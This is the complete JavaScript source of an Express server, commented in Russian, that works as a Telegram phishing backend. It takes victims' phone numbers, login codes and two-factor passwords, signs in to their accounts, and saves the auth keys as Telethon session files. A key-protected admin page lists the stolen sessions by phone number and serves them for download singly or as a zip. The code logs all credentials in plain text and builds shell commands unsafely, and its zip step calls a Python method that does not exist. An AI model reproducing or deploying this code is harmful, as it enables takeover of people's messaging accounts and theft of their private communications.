const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions/');
const { computeCheck } = require('telegram/Password');
const { execSync } = require('child_process');

// ===== ЗАГРУЗКА API ДАННЫХ =====
const { API_ID, API_HASH } = require('./config');

console.log('=== ЗАПУСК СЕРВЕРА ===');
console.log('API_ID:', API_ID);
console.log('API_HASH:', API_HASH);
console.log('========================');

const app = express();

app.use(express.json({ strict: false }));
app.use(express.urlencoded({ extended: true }));

// Логирование POST-запросов
app.use((req, res, next) => {
    if (req.method === 'POST') {
        console.log('\n📥', req.method, req.url);
        console.log('📦 Body:', JSON.stringify(req.body, null, 2));
    }
    next();
});

app.use(express.static(__dirname));

app.use(session({
    secret: 'super-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: {
        secure: false,          // в продакшене – true
        maxAge: 1000 * 60 * 60 * 24,
        sameSite: 'lax'
    },
}));

const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

function getSessionFilePath(phone) {
    const clean = phone.replace(/[^0-9]/g, '');
    return path.join(SESSIONS_DIR, `${clean}.session`);
}

function saveTelethonSession(phone, client, targetPath) {
    try {
        const dcId = client.session.dcId;
        const serverAddress = client.session.serverAddress;
        const port = client.session.port;
        const authKey = client.session.authKey;
        if (!authKey) {
            throw new Error("No authKey in session");
        }
        const keyBuffer = authKey.getKey();
        if (!keyBuffer) {
            throw new Error("No key buffer in authKey");
        }
        const authKeyHex = keyBuffer.toString('hex');

        console.log(`📡 Exporting Telethon Session: DC=${dcId}, IP=${serverAddress}, Port=${port}`);

        const pythonCode = `
import sqlite3
import sys

db_path = sys.argv[1]
dc_id = int(sys.argv[2])
ip = sys.argv[3]
port = int(sys.argv[4])
auth_key = bytes.fromhex(sys.argv[5])

conn = sqlite3.connect(db_path)
c = conn.cursor()

c.execute('CREATE TABLE IF NOT EXISTS sessions (dc_id INTEGER PRIMARY KEY, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER)')
c.execute('CREATE TABLE IF NOT EXISTS entities (id INTEGER PRIMARY KEY, hash INTEGER, username TEXT, phone TEXT, name TEXT)')
c.execute('CREATE TABLE IF NOT EXISTS sent_files (md5_digest BLOB, file_size INTEGER, type INTEGER, id INTEGER, hash INTEGER, PRIMARY KEY(md5_digest, file_size, type))')
c.execute('CREATE TABLE IF NOT EXISTS update_state (id INTEGER PRIMARY KEY, pts INTEGER, qts INTEGER, date INTEGER, seq INTEGER, unread_count INTEGER)')
c.execute('CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)')

c.execute('INSERT OR REPLACE INTO version (version) VALUES (7)')
c.execute('INSERT OR REPLACE INTO sessions (dc_id, server_address, port, auth_key) VALUES (?, ?, ?, ?)', (dc_id, ip, port, auth_key))

conn.commit()
conn.close()
`;

        const tempPyPath = path.join(__dirname, `temp_session_${phone.replace(/[^0-9]/g, '')}.py`);
        fs.writeFileSync(tempPyPath, pythonCode, 'utf-8');

        if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath);
        }

        execSync(`python "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, { stdio: 'ignore' });
        fs.unlinkSync(tempPyPath);

        const fileSize = fs.statSync(targetPath).size;
        console.log(`✅ Telethon SQLite Session generated successfully: ${targetPath} (${fileSize} bytes)`);
        return true;
    } catch (e) {
        console.error("❌ Error generating Telethon SQLite session:", e);
        try {
            const sessionString = client.session.save();
            fs.writeFileSync(targetPath, sessionString, 'utf-8');
            console.log(`⚠️ Saved fallback StringSession (size: ${fs.statSync(targetPath).size} bytes)`);
        } catch (err) {
            console.error("❌ Critical: Failed to save fallback session:", err);
        }
        return false;
    }
}

// ===== ОТПРАВКА КОДА =====
app.post('/api/send-code', async (req, res) => {
    console.log('\n🔵 /api/send-code вызван');
    const phone = req.body.phone;
    console.log('🔵 Получен phone:', phone);

    if (!phone) {
        return res.status(400).json({ error: 'Номер телефона не указан' });
    }

    // Удаляем старую сессию
    try {
        const filePath = getSessionFilePath(phone);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        console.log('🗑️ Старая сессия удалена');
    } catch (_) {}

    let client;
    try {
        client = new TelegramClient(
            new StringSession(''),
            Number(API_ID),
            API_HASH,
            { connectionRetries: 5, requestRetries: 5 }
        );
        await client.connect();
        console.log('✅ Клиент подключён');

        const result = await client.sendCode(
            { apiId: Number(API_ID), apiHash: API_HASH },
            phone
        );
        console.log('📨 Код отправлен');
        console.log('📨 phoneCodeHash:', result.phoneCodeHash);

        req.session.phoneCodeHash = result.phoneCodeHash;
        req.session.phone = phone;
        req.session.tempSession = client.session.save();
        console.log('💾 Сессия сохранена (длина:', req.session.tempSession.length, ')');

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Ошибка sendCode:', error);
        console.error('Stack:', error.stack);
        const errorMsg = error.errorMessage || error.message || 'Неизвестная ошибка';
        res.status(500).json({ error: 'Ошибка отправки кода: ' + errorMsg });
    } finally {
        if (client) try { await client.disconnect(); } catch (_) {}
    }
});

// ===== ПРОВЕРКА КОДА =====
app.post('/api/verify-code', async (req, res) => {
    console.log('\n🔵 /api/verify-code вызван');
    const { phone, code } = req.body;
    console.log('🔵 phone:', phone);
    console.log('🔵 code:', code);

    if (!phone || !code) {
        return res.status(400).json({ error: 'Телефон и код обязательны' });
    }

    if (req.session.phone !== phone) {
        console.log(`❌ Номер не совпадает: сессия=${req.session.phone}, запрос=${phone}`);
        return res.status(400).json({ error: 'Номер не совпадает с запрошенным' });
    }

    const phoneCodeHash = req.session.phoneCodeHash;
    const tempSession = req.session.tempSession;

    if (!phoneCodeHash || !tempSession) {
        return res.status(400).json({ error: 'Сначала запросите код' });
    }

    let client;
    try {
        client = new TelegramClient(
            new StringSession(tempSession),
            Number(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );
        await client.connect();
        console.log('✅ Клиент восстановлен из сессии');

        await client.invoke(new Api.auth.SignIn({
            phoneNumber: phone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code,
        }));
        console.log('✅ Вход успешен!');

        saveTelethonSession(phone, client, getSessionFilePath(phone));
        console.log('💾 Постоянная сессия сохранена в формате Telethon');

        delete req.session.phoneCodeHash;
        delete req.session.tempSession;
        delete req.session.phone;

        res.json({ success: true, cloudPasswordRequired: false });
    } catch (error) {
        console.error('❌ Ошибка verify-code:', error);
        console.error('Stack:', error.stack);

        const errorMsg = error.errorMessage || error.message || '';

        if (errorMsg.includes('SESSION_PASSWORD_NEEDED') || errorMsg.includes('PASSWORD_HASH')) {
            console.log('🔐 Требуется облачный пароль');
            req.session.tempSessionForPassword = req.session.tempSession;
            delete req.session.tempSession;
            return res.json({ success: true, cloudPasswordRequired: true });
        }

        if (errorMsg.includes('PHONE_CODE_INVALID') || errorMsg.includes('CODE_INVALID')) {
            return res.status(400).json({ error: 'Неверный код. Попробуйте снова.' });
        }

        res.status(400).json({ error: 'Ошибка проверки кода: ' + errorMsg });
    } finally {
        if (client) try { await client.disconnect(); } catch (_) {}
    }
});

// ===== ПРОВЕРКА ОБЛАЧНОГО ПАРОЛЯ =====
app.post('/api/verify-password', async (req, res) => {
    console.log('\n🔵 /api/verify-password вызван');
    const { phone, password } = req.body;
    if (!phone || !password) {
        return res.status(400).json({ error: 'Телефон и пароль обязательны' });
    }

    if (req.session.phone !== phone) {
        return res.status(400).json({ error: 'Номер не совпадает' });
    }

    const tempSession = req.session.tempSessionForPassword;
    if (!tempSession) {
        return res.status(400).json({ error: 'Сначала подтвердите код' });
    }

    let client;
    try {
        client = new TelegramClient(
            new StringSession(tempSession),
            Number(API_ID),
            API_HASH,
            { connectionRetries: 5 }
        );
        await client.connect();

        const pwd = await client.invoke(new Api.account.GetPassword());
        const passwordSrpCheck = await computeCheck(pwd, password);
        await client.invoke(new Api.auth.CheckPassword({ password: passwordSrpCheck }));
        console.log('✅ Пароль верный для', phone);

        saveTelethonSession(phone, client, getSessionFilePath(phone));
        delete req.session.tempSessionForPassword;
        delete req.session.phone;

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Ошибка checkPassword:', error);
        const errorMsg = error.errorMessage || error.message || '';
        res.status(400).json({ error: 'Неверный облачный пароль: ' + errorMsg });
    } finally {
        if (client) try { await client.disconnect(); } catch (_) {}
    }
});

// ===== АДМИН-ПАНЕЛЬ ДЛЯ ВЫГРУЗКИ СЕССИЙ =====
app.get('/admin/sessions', (req, res) => {
    const key = req.query.key;
    const { ADMIN_KEY } = require('./config');
    
    if (key !== ADMIN_KEY) {
        return res.status(403).send('Доступ запрещен. Укажите верный ?key=ваш_ключ');
    }

    try {
        const files = fs.readdirSync(SESSIONS_DIR).filter(f => f.endsWith('.session'));
        let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Управление сессиями</title>
            <style>
                body { font-family: -apple-system, sans-serif; background: #0b0f19; color: #f8fafc; padding: 40px 20px; text-align: center; }
                .container { max-width: 600px; margin: 0 auto; background: rgba(15, 23, 42, 0.75); padding: 30px; border-radius: 24px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
                h1 { color: #ffaa00; margin-bottom: 20px; font-size: 24px; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th, td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); text-align: left; }
                th { background: rgba(255,255,255,0.05); color: #94a3b8; }
                a { color: #00f2fe; text-decoration: none; font-weight: 700; }
                a:hover { text-decoration: underline; }
                .btn { background: linear-gradient(135deg, #ff0055, #ffaa00); color: white; padding: 12px 24px; border-radius: 12px; text-decoration: none; display: inline-block; margin-bottom: 20px; font-weight: bold; border: none; box-shadow: 0 4px 15px rgba(255,0,85,0.3); }
                .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(255,0,85,0.4); }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Управление сессиями (Telethon)</h1>
                <a href="/admin/sessions/download-all?key=${key}" class="btn">📥 Скачать все архивом (.zip)</a>
                <table>
                    <thead>
                        <tr>
                            <th>Сессия (Номер)</th>
                            <th>Размер</th>
                            <th>Действие</th>
                        </tr>
                    </thead>
                    <tbody>
        `;

        if (files.length === 0) {
            html += `<tr><td colspan="3" style="text-align: center; color: #94a3b8; padding: 20px;">Сессий пока нет</td></tr>`;
        } else {
            files.forEach(file => {
                const stat = fs.statSync(path.join(SESSIONS_DIR, file));
                const sizeKB = (stat.size / 1024).toFixed(1);
                html += `
                    <tr>
                        <td>📱 +${file.replace('.session', '')}</td>
                        <td>${sizeKB} KB</td>
                        <td><a href="/admin/sessions/download/${file}?key=${key}">Скачать</a></td>
                    </tr>
                `;
            });
        }

        html += `
                    </tbody>
                </table>
            </div>
        </body>
        </html>
        `;
        res.send(html);
    } catch (e) {
        res.status(500).send('Ошибка сервера: ' + e.message);
    }
});

// Скачивание отдельного файла сессии
app.get('/admin/sessions/download/:file', (req, res) => {
    const { key } = req.query;
    const { ADMIN_KEY } = require('./config');
    if (key !== ADMIN_KEY) return res.status(403).send('Доступ запрещен');

    const file = req.params.file;
    const filePath = path.join(SESSIONS_DIR, file);
    if (!fs.existsSync(filePath)) return res.status(404).send('Файл не найден');

    res.download(filePath);
});

// Скачивание всех сессий архивом ZIP
app.get('/admin/sessions/download-all', (req, res) => {
    const { key } = req.query;
    const { ADMIN_KEY } = require('./config');
    if (key !== ADMIN_KEY) return res.status(403).send('Доступ запрещен');

    try {
        const zipPath = path.join(__dirname, 'sessions.zip');
        // Используем встроенный модуль zipfile в Python
        const zipCommand = `python -c "import zipfile, os; zipf = zipfile.ZipFile('${zipPath.replace(/\\/g, '\\\\')}', 'w', zipfile.ZIP_DEFLATED); [zipf.write(os.path.join('${SESSIONS_DIR.replace(/\\/g, '\\\\')}', f), f) for f in os.listdir('${SESSIONS_DIR.replace(/\\/g, '\\\\')}') if f.endsWith('.session')]; zipf.close()"`;
        
        execSync(zipCommand);
        
        if (!fs.existsSync(zipPath)) {
            return res.status(500).send('Не удалось сгенерировать zip архив');
        }
        
        res.download(zipPath, 'sessions.zip', () => {
            try { fs.unlinkSync(zipPath); } catch(_) {}
        });
    } catch(e) {
        res.status(500).send('Ошибка архивации: ' + e.message);
    }
});

// ===== ЗАПУСК =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n🚀 Сервер запущен на http://localhost:${PORT}`);
    console.log(`📁 Сессии сохраняются в ${SESSIONS_DIR}\n`);
});